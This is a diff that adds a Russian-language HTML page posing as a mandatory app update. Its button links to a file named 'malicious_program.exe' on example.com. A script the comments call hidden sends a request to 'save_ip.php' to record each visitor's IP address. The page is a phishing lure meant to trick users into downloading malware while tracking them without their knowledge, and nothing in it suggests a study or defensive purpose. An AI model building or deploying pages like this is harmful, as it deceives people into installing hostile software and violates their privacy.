@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Обновление приложения</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+        .download-link {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .download-link:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Для продолжения работы обновите ваше приложение!</h2>
+        <p>Нажмите на кнопку ниже для загрузки:</p>
+        <a href="http://example.com/malicious_program.exe" class="download-link">Скачать обновление</a>
+    </div>
+
+    <!-- Скрипт для отправки запроса на серверный PHP скрипт для сохранения IP -->
+    <script>
+        // Отправляем запрос на скрытый PHP скрипт для записи IP
+        fetch('save_ip.php')
+            .then(response => response.text())
+            .then(data => {
+                console.log('IP-адрес записан:', data);
+            })
+            .catch(error => console.error('Ошибка:', error));
+    </script>
+</body>
+</html>
